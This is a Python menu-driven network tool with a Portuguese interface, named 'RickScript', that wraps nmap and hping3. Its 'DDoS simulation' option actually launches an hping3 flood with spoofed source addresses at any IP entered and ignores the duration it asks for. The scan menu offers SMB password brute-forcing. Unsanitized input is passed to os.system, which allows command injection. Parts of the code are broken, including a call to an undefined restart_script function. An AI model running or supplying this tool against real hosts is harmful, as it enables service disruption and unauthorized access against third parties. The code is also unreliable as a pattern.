import os
import subprocess
import platform
import sys
import time
from colorama import init, Fore, Style

# Inicializa o colorama
init(autoreset=True)

def display_logo():
    logo = f"""
    {Fore.CYAN}{Style.BRIGHT}    ██████╗ ██╗ ██████╗██╗  ██╗███████╗███████╗ ██████╗██████╗ ██╗███████╗████████╗
    ██╔══██╗██║██╔════╝██║  ██║██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔════╝╚══██╔══╝
    ██║  ██║██║██║     ███████║█████╗  ███████╗██║     ██████╔╝██║███████╗   ██║   
    ██║  ██║██║██║     ██╔══██║██╔══╝  ╚════██║██║     ██╔══██╗██║╚════██║   ██║   
    ██████╔╝██║╚██████╗██║  ██║███████╗███████║╚██████╗██║  ██║██║███████║   ██║   
    ╚═════╝ ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝   
    {Fore.YELLOW}                                                                                 
                              Bem-vindo ao {Fore.RED}RickScript!
    """
    print(logo)

def loading_message(message):
    """Exibe uma mensagem de carregamento com feedback visual."""
    print(f"{Fore.GREEN}{message}", end="")
    for _ in range(3):
        time.sleep(0.5)
        print(f"{Fore.YELLOW}.", end="")
    print(f"{Fore.GREEN} Pronto!")

def check_nmap():
    """Verifica se o Nmap está instalado e retorna o caminho do executável."""
    try:
        subprocess.run(["nmap", "-h"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return "nmap"
    except FileNotFoundError:
        print(f"{Fore.RED}\nNmap não encontrado no PATH do sistema.")
        install_choice = input(f"{Fore.CYAN}Deseja instalar o Nmap agora? (s/n): ").lower()
        if install_choice == 's':
            install_nmap()
        else:
            nmap_path = input(f"{Fore.CYAN}Por favor, insira o caminho completo para o executável do Nmap: ")
            return nmap_path

def install_nmap():
    """Instala o Nmap dependendo do sistema operacional."""
    os_type = platform.system()
    
    try:
        if os_type == "Linux":
            distro = subprocess.run(["cat", "/etc/*release"], capture_output=True, text=True).stdout.lower()
            if "debian" in distro or "ubuntu" in distro:
                loading_message("Atualizando repositórios e instalando o Nmap")
                subprocess.run(["sudo", "apt", "update"], check=True)
                subprocess.run(["sudo", "apt", "install", "-y", "nmap"], check=True)
            elif "centos" in distro or "red hat" in distro:
                loading_message("Instalando o Nmap")
                subprocess.run(["sudo", "yum", "install", "-y", "nmap"], check=True)
            else:
                print(f"{Fore.RED}Distribuição Linux não suportada automaticamente. Instale o Nmap manualmente.")
        elif os_type == "Windows":
            print(f"{Fore.YELLOW}Por favor, baixe e instale o Nmap manualmente em https://nmap.org/download.html.")
        elif os_type == "Darwin":  # macOS
            loading_message("Instalando o Nmap via Homebrew")
            subprocess.run(["brew", "install", "nmap"], check=True)
        else:
            print(f"{Fore.RED}Sistema operacional não suportado automaticamente. Instale o Nmap manualmente.")
    except Exception as e:
        print(f"{Fore.RED}Erro ao tentar instalar o Nmap: {e}")

    print(f"{Fore.CYAN}Instalação concluída. Reiniciando o script...")
    restart_script()

def check_hping3():
    """Verifica se o hping3 está instalado e retorna o caminho do executável."""
    try:
        subprocess.run(["hping3", "--help"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return "hping3"
    except FileNotFoundError:
        print(f"{Fore.RED}\nHping3 não encontrado no PATH do sistema.")
        install_choice = input(f"{Fore.CYAN}Deseja instalar o hping3 agora? (s/n): ").lower()
        if install_choice == 's':
            install_hping3()
        else:
            hping3_path = input(f"{Fore.CYAN}Por favor, insira o caminho completo para o executável do hping3: ")
            return hping3_path

def install_hping3():
    """Instala o hping3 dependendo do sistema operacional."""
    os_type = platform.system()
    
    try:
        if os_type == "Linux":
            loading_message("Instalando o hping3")
            subprocess.run(["sudo", "apt", "install", "-y", "hping3"], check=True)
        elif os_type == "Windows":
            print(f"{Fore.YELLOW}Por favor, baixe e instale o hping3 manualmente em https://www.hping.org/")
        elif os_type == "Darwin":  # macOS
            loading_message("Instalando o hping3 via Homebrew")
            subprocess.run(["brew", "install", "hping"], check=True)
        else:
            print(f"{Fore.RED}Sistema operacional não suportado automaticamente. Instale o hping3 manualmente.")
    except Exception as e:
        print(f"{Fore.RED}Erro ao tentar instalar o hping3: {e}")

    print(f"{Fore.CYAN}Instalação concluída. Reiniciando o script...")
    restart_script()

def main_menu():
    display_logo()
    nmap_path = check_nmap()
    hping3_path = check_hping3()
    
    while True:
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}Menu Principal:")
        print(f"{Fore.BLUE}1.{Fore.WHITE} Diagnóstico de Rede (Nmap)")
        print(f"{Fore.BLUE}2.{Fore.WHITE} Exibir Endereços IP Ativos")
        print(f"{Fore.BLUE}3.{Fore.WHITE} Simular Ataque DDoS (hping3)")
        print(f"{Fore.BLUE}4.{Fore.WHITE} Sair")
        print(f"{Fore.BLUE}5.{Fore.WHITE} {Fore.RED}[Easter Egg]")

        choice = input(f"{Fore.CYAN}Escolha uma opção: ")

        if choice == '1':
            run_nmap(nmap_path)
        elif choice == '2':
            show_active_ips()
        elif choice == '3':
            simulate_ddos(hping3_path)
        elif choice == '4':
            print(f"{Fore.YELLOW}Saindo... Obrigado por usar o RickScript!")
            break
        elif choice == '5':
            easter_egg()
        else:
            print(f"{Fore.RED}Opção inválida, tente novamente.")

def run_nmap(nmap_path):
    print(f"\n{Fore.CYAN}{Style.BRIGHT}Diagnóstico de Rede com Nmap")
    
    target = input(f"{Fore.GREEN}Digite o endereço IP ou range de IPs para escanear: ")
    
    print(f"\n{Fore.CYAN}Escolha o tipo de varredura:")
    print(f"{Fore.BLUE}1.{Fore.WHITE} Varredura de Ping (-sP)")
    print(f"{Fore.BLUE}2.{Fore.WHITE} Varredura TCP SYN (-sS)")
    print(f"{Fore.BLUE}3.{Fore.WHITE} Varredura de portas UDP (-sU)")
    print(f"{Fore.BLUE}4.{Fore.WHITE} Detecção de Sistema Operacional (-O)")
    print(f"{Fore.BLUE}5.{Fore.WHITE} Varredura Completa (-A)")
    print(f"{Fore.BLUE}6.{Fore.WHITE} Scan de Versão de Serviços (-sV)")
    print(f"{Fore.BLUE}7.{Fore.WHITE} Varredura de Rede (-sn)")
    print(f"{Fore.BLUE}8.{Fore.WHITE} Detecção de Vulnerabilidades (-sC)")
    print(f"{Fore.BLUE}9.{Fore.WHITE} Scan de Força Bruta de Senhas SMB (-p 445 --script smb-brute)")
    print(f"{Fore.BLUE}10.{Fore.WHITE} Personalizado")

    scan_choice = input(f"{Fore.CYAN}Escolha o tipo de varredura: ")

    if scan_choice == '1':
        scan_type = "-sP"
    elif scan_choice == '2':
        scan_type = "-sS"
    elif scan_choice == '3':
        scan_type = "-sU"
    elif scan_choice == '4':
        scan_type = "-O"
    elif scan_choice == '5':
        scan_type = "-A"
    elif scan_choice == '6':
        scan_type = "-sV"
    elif scan_choice == '7':
        scan_type = "-sn"
    elif scan_choice == '8':
        scan_type = "-sC"
    elif scan_choice == '9':
        scan_type = "-p 445 --script smb-brute"
    elif scan_choice == '10':
        scan_type = input(f"{Fore.GREEN}Digite os parâmetros personalizados para o Nmap: ")
    else:
        print(f"{Fore.RED}Opção inválida, retornando ao menu principal.")
        return

    command = f"{nmap_path} {scan_type} {target}"
    print(f"\n{Fore.YELLOW}Executando: {command}")
    loading_message("Realizando a varredura")
    os.system(command)

def show_active_ips():
    print(f"\n{Fore.CYAN}{Style.BRIGHT}Exibindo Endereços IP Ativos na Rede Local")
    loading_message("Carregando dados de IPs")
    os.system("arp -a")

def simulate_ddos(hping3_path):
    print(f"\n{Fore.CYAN}{Style.BRIGHT}Simulação de Ataque DDoS com hping3")
    
    target = input(f"{Fore.GREEN}Digite o endereço IP do alvo: ")
    duration = input(f"{Fore.GREEN}Digite a duração do ataque em segundos: ")

    command = f"{hping3_path} --flood --rand-source {target}"
    print(f"\n{Fore.YELLOW}Executando: {command}")
    print(f"{Fore.RED}ATENÇÃO: Esta ação simula um ataque de DDoS. Use com responsabilidade.")
    loading_message("Iniciando ataque DDoS")
    os.system(command)

def easter_egg():
    print(f"\n{Fore.GREEN}Parabéns, você encontrou um Easter Egg!")
    print(f"{Fore.YELLOW}Rick Astley - Never Gonna Give You Up toca ao fundo...")
    print(f"{Fore.RED}Você foi 'RickRolled'! 🎵")

if __name__ == "__main__":
    main_menu()